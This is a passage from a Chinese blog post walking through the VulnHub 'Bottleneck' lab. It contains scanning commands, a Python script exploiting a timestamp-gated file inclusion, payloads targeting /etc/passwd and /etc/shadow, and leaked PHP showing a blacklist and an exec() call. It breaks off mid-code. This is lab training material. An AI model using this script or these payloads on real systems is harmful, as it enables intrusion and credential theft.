@@ -1,0 +1,1670 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>Bottleneck | txjg blog</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://cdn.jsdelivr.net/gh/inkss/fontawesome@5.15.3/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+    <script>
+        var themeModelId = '5';
+        if (themeModelId) {
+            localStorage.setItem('modelId', themeModelId);
+        }
+    </script>
+    
+    <script src="https://cdn.jsdelivr.net/gh/yuang01/live2d-widget@latest/autoload.js"></script>
+    <script>
+        var live2dOpen = eval('true') || false;
+        if (!live2dOpen) {
+            localStorage.setItem('waifu-display', 1609323474481);
+        }
+    </script>
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+  
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  
+  <!-- 依赖于jquery和vue -->
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+
+  
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.11/dist/vue.min.js"></script>
+
+  
+  
+  <body>
+    <!-- 预加载动画 -->
+    <!-- 页面预加载动画 -->
+
+<div id='loader'>
+  <link rel="stylesheet" href="/js/loaded/index.css" >
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="configure-border-1">
+      <div class="configure-core"></div>
+    </div>
+    <div class="configure-border-2">
+      <div class="configure-core"></div>
+    </div>
+    <div class="loading-word">加载中...</div>
+  </div>
+</div>
+
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+  
+</script>
+
+    
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (href, before, media, attributes) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header   " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
+      <h3 class="drawer-box-head_title">txjg blog</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">txjg blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+    
+    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
+    
+        <link href="/js/prism/prism-twilight.min.css" rel="stylesheet">
+    
+
+    <style>
+        pre[class*="language-"] {
+            overflow-y: hidden;
+        }
+        .line-numbers .line-numbers-rows {
+            border: none;
+        }
+    </style>
+  
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('/medias/3.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        Bottleneck
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> 发表于：2023-09-06 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> 分类：
+          
+            <a href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" class="post-detail-header_category">
+              靶场渗透
+            </a>
+          
+            <a href="/categories/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/vulnhub%E9%9D%B6%E5%9C%BA/" class="post-detail-header_category">
+              vulnhub靶场
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="row justify-position" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="Bottleneck靶场闯关"><a href="#Bottleneck靶场闯关" class="headerlink" title="Bottleneck靶场闯关"></a>Bottleneck靶场闯关</h1><p>确定靶机的IP地址</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> netdiscover <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.124.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/1.png" class="">
+<p>对靶机进行端口服务扫描</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> -p- <span class="token number">192.168</span>.124.16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/2.png" class="">
+<p>可以看到靶机开放了22和80端口<br>dirsearch对靶机80端口进行爆破</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> http://192.168.124.16 <span class="token parameter variable">-e</span> php,txt,html,zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/3.png" class="">
+<p>dirb对靶机80端口进行爆破</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.124.16 <span class="token parameter variable">-X</span> .php,.txt,.zip,.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/4.png" class="">
+<p>gobuster对靶机80端口进行爆破</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.124.16 <span class="token parameter variable">-x</span> .php,.html,.zip,.txt <span class="token parameter variable">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/5.png" class="">
+<p>综合80端口的爆破结果来看，有<code>/css</code> <code>/img</code> <code>/js</code> <code>/vendor</code> <code>image_gallery.php</code> <code>index.php</code>这几个目录和文件<br>访问<code>index.php</code></p>
+<img src="/2023/09/06/Bottleneck/6.png" class="">
+<p>没发现有啥有价值的信息<br>访问<code>image_gallery.php</code></p>
+<img src="/2023/09/06/Bottleneck/7.png" class="">
+<p>F12打开开发者模式</p>
+<img src="/2023/09/06/Bottleneck/8.png" class="">
+<p>对<code>Ym90dGxlbmVja19kb250YmUucG5n</code>进行解密</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Ym90dGxlbmVja19kb250YmUucG5n"</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img src="/2023/09/06/Bottleneck/9.png" class="">
+<p>猜测此处可能存在文件包含漏洞。<br>刷新页面，发现该链接中参数<code>t</code>的值一直在改变</p>
+<img src="/2023/09/06/Bottleneck/10.png" class="">
+<p>对该请求进行重放，发现重放后的请求没有响应数据</p>
+<img src="/2023/09/06/Bottleneck/11.png" class="">
+<img src="/2023/09/06/Bottleneck/12.png" class="">
+<p>因此我们猜测该参数<code>t</code>应该为时间戳，时间戳正确则返回响应数据，错误则没有响应数据。<br>因此我们写脚本实时生成当前时间戳，让payload文本内容为bottleneck_dontbe.png<br>脚本如下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> argparse
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> time
+
+<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>dictFile<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span>dictFile<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>
+    words<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> word <span class="token keyword">in</span> words<span class="token punctuation">:</span>
+        timestamp<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        payload<span class="token operator">=</span>word<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+        payloadBase64<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'t'</span><span class="token punctuation">:</span>timestamp<span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">:</span>payloadBase64<span class="token punctuation">&#125;</span>
+        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"send success"</span><span class="token punctuation">)</span>
+        result<span class="token operator">=</span>response<span class="token punctuation">.</span>text
+        write<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ff<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result.txt"</span><span class="token punctuation">,</span><span class="token string">"a+"</span><span class="token punctuation">)</span>
+    begin<span class="token operator">=</span><span class="token string">"\r\n[*]++++++ exploit result ++++++\r\n"</span>
+    ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>begin<span class="token punctuation">)</span>
+    ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    parser<span class="token operator">=</span>argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"bottleneck exp"</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span><span class="token string">'--url'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span><span class="token string">'--dictFile'</span><span class="token punctuation">)</span>
+    args<span class="token operator">=</span>parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    url<span class="token operator">=</span>args<span class="token punctuation">.</span>url
+    dictFile<span class="token operator">=</span>args<span class="token punctuation">.</span>dictFile
+    exploit<span class="token punctuation">(</span>url<span class="token punctuation">,</span>dictFile<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行脚本</p>
+<img src="/2023/09/06/Bottleneck/13.png" class="">
+<p>result.txt文件内容为</p>
+<img src="/2023/09/06/Bottleneck/14.png" class="">
+<p>成功获得了响应数据。<br>测试是否存在文件包含漏洞，payload.txt文件内容为</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;passwd
+&#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>result.txt文件内容为</p>
+<img src="/2023/09/06/Bottleneck/15.png" class="">
+<p>从获得的文件内容来看，我们的payload被waf拦截了。。。<br>既然读取不了靶机的敏感信息，我们尝试来读取当前页面image_gallery.php源码来看看有没有什么发现，payload.txt内容如下</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;image_gallery.php
+..&#x2F;image_gallery.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>result.txt文件内容为</p>
+<pre class="line-numbers language-none"><code class="language-none">[*]++++++ exploit result ++++++
+
+Let me throw away your nice request into the bin.
+The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.
+Why don&#39;t you wait on your chair until someone (maybe the police) knock on your door?
+
+&lt;pre&gt;
+                                   _,..._
+                                  &#x2F;__    \
+                                   &gt;&lt; &#96;.  \
+                                  &#x2F;_    \ |
+                                   \-_  &#x2F;:|
+                                 ,--&#39;..&#39;. :
+                               ,&#39;         &#96;.
+                            _,&#39;             \
+                   _.._,--&#39;&#39;    ,           |
+               , ,&#39;,, _|    _,.&#39;|      |    |
+            \||&#x2F;,&#39;(,&#39; &#39;--&#39;&#39;    |      |    |
+       _     |||                |      &#x2F;-&#39;  |
+      | |   (- -)&lt;&#96;._           |     &#x2F;    &#x2F;
+      | |  \_\O&#x2F;_&#x2F;&#96;-.(&lt;&lt;        |____&#x2F;    &#x2F;
+      | |   &#x2F;   \              &#x2F; -&#39;| &#96;--.&#39;|
+      | |   \___&#x2F;             &#x2F;           &#x2F;
+      | |    H H             &#x2F;     |     |
+      |_|_..-H-H--.._       &#x2F;     ,|     |
+        |-.._&quot;_&quot;__..-|     |   _-&#x2F; |     |
+        |            |     |    |   \_   |
+        |            |     |    |   |    |
+        |            |     |____|   |    |
+        |            |  _..&#39;    |   |____|
+        |            |_(____..._&#39; _.&#39;    |
+        &#96;-..______..-&#39;&quot;&quot;         (___..--&#39;
+&lt;pre&gt;
+[*]++++++ exploit result ++++++
+&lt;?php
+&#x2F;*
+CHANGELOG
+v1.1: Still testing without content.
+    I&#39;ve fixed that problem that @p4w and @ska notified me after hacker attack.
+    Shit I&#39;m too lazy to make a big review of my code.
+    I think that the LFI problem can be mitigated with the blacklist.
+    By the way to protect me from attackers, all malicious requests are immediately sent to the SOC
+
+v1.0: Starting this beautiful gallery
+*&#x2F;
+
+$tstamp &#x3D; time();
+if(isset($_GET[&#39;t&#39;]) &amp;&amp; isset($_GET[&#39;f&#39;]))&#123;
+    include_once &#39;image_gallery_load.php&#39;;
+    exit();
+&#125;
+
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>由此看来，payload为</p>
+<pre class="line-numbers language-none"><code class="language-none">..&#x2F;image_gallery.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>从上面可以看到，image_gallery.php源码中包含了image_gallery_load.php,我们继续利用文件包含漏洞读取该文件<br>image_gallery_load.php文件的源码如下</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+function print_troll()&#123;
+    $messages &#x3D; $GLOBALS[&#39;messages&#39;];
+    $troll &#x3D; $GLOBALS[&#39;troll&#39;];
+    echo $messages[0];
+    echo $troll;
+&#125;
+
+$troll &#x3D; &lt;&lt;&lt;EOT
+&lt;pre&gt;
+                                   _,..._
+                                  &#x2F;__    \
+                                   &gt;&lt; &#96;.  \
+                                  &#x2F;_    \ |
+                                   \-_  &#x2F;:|
+                                 ,--&#39;..&#39;. :
+                               ,&#39;         &#96;.
+                            _,&#39;             \
+                   _.._,--&#39;&#39;    ,           |
+               , ,&#39;,, _|    _,.&#39;|      |    |
+            \\||&#x2F;,&#39;(,&#39; &#39;--&#39;&#39;    |      |    |
+       _     |||                |      &#x2F;-&#39;  |
+      | |   (- -)&lt;&#96;._           |     &#x2F;    &#x2F;
+      | |  \_\O&#x2F;_&#x2F;&#96;-.(&lt;&lt;        |____&#x2F;    &#x2F;
+      | |   &#x2F;   \              &#x2F; -&#39;| &#96;--.&#39;|
+      | |   \___&#x2F;             &#x2F;           &#x2F;
+      | |    H H             &#x2F;     |     |
+      |_|_..-H-H--.._       &#x2F;     ,|     |
+        |-.._&quot;_&quot;__..-|     |   _-&#x2F; |     |
+        |            |     |    |   \_   |
+        |            |     |    |   |    |
+        |            |     |____|   |    |
+        |            |  _..&#39;    |   |____|
+        |            |_(____..._&#39; _.&#39;    |
+        &#96;-..______..-&#39;&quot;&quot;         (___..--&#39;
+&lt;pre&gt;
+EOT;
+
+if(!isset($_GET[&#39;t&#39;]) || !isset($_GET[&#39;f&#39;]))&#123;
+    exit();
+&#125;
+
+$imagefile &#x3D; base64_decode($_GET[&#39;f&#39;]);
+$timestamp &#x3D; time();
+$isblocked &#x3D; FALSE;
+$blacklist &#x3D; array(&#39;&#x2F;etc&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;var&#39;,&#39;&#x2F;opt&#39;,&#39;&#x2F;proc&#39;,&#39;&#x2F;dev&#39;,&#39;&#x2F;lib&#39;,&#39;&#x2F;bin&#39;,&#39;&#x2F;usr&#39;,&#39;&#x2F;home&#39;,&#39;&#x2F;ids&#39;);
+$messages &#x3D; array(&quot;\nLet me throw away your nice request into the bin.\n&quot;.
+    &quot;The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.\n&quot;.
+    &quot;Why don&#39;t you wait on your chair until someone (maybe the police) knock on your door?\n\n&quot;);
+
+if(abs($_GET[&#39;t&#39;] - $timestamp) &gt; 10)&#123;
+    exit();
+&#125;
+foreach($blacklist as $elem)&#123;
+    if(strstr($imagefile, $elem) !&#x3D;&#x3D; FALSE)
+        $isblocked &#x3D; TRUE;
+&#125;
+&#x2F;&#x2F; report the intrusion to the soc and save information locally for further investigation
+if($isblocked)&#123;
+    $logfile &#x3D; &#39;intrusion_&#39;.$timestamp;
+    $fp &#x3D; fopen(&#39;&#x2F;var&#x2F;log&#x2F;soc&#x2F;&#39;.$logfile, &#39;w&#39;);
+    fwrite($fp, &quot;&#39;&quot;.$imagefile.&quot;&#39;&quot;);
+    fclose($fp);
+    exec(&#39;python &#x2F;opt&#x2F;ids_strong_bvb.py &lt;&#x2F;var&#x2F;log&#x2F;soc&#x2F;&#39;.$logfile.&#39; &gt;&#x2F;tmp&#x2F;output 2&gt;&amp;1&#39;);
+    print_troll();
+    exit();
+&#125;
+chdir(&#39;img&#39;);
+$filecontent &#x3D; file_get_contents($imagefile);
+if($filecontent &#x3D;&#x3D;&#x3D; FALSE)&#123;
+    print_troll();
+&#125;
+else&#123;
+    echo $filecontent;
+&#125;
+chdir(&#39;..&#x2F;&#39;);
+
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过阅读image_gallery_load.php的源代码，我们可以获取到靶机系统的黑名单代码为</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/etc'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/opt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/var'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/opt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/proc'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/dev'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/lib'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/bin'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/usr'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/home'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/ids'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>通过阅读image_gallery_load.php的源代码，我们了解到当我们的payload中含有黑名单中的字符时就会在<code>/var/log/soc/</code>目录下生成一个<code>intrusion_timestamp</code>的文件，然后系统就会将该文件交给<code>/opt/ids_strong_bvb.py</code>程序来进行处理，最后将处理结果输出到<code>/tmp/output</code>文件中，对应的源码如下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isblocked</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$logfile</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'intrusion_'</span><span class="token operator">.</span><span class="token variable">$timestamp</span><span class="token punctuation">;</span>
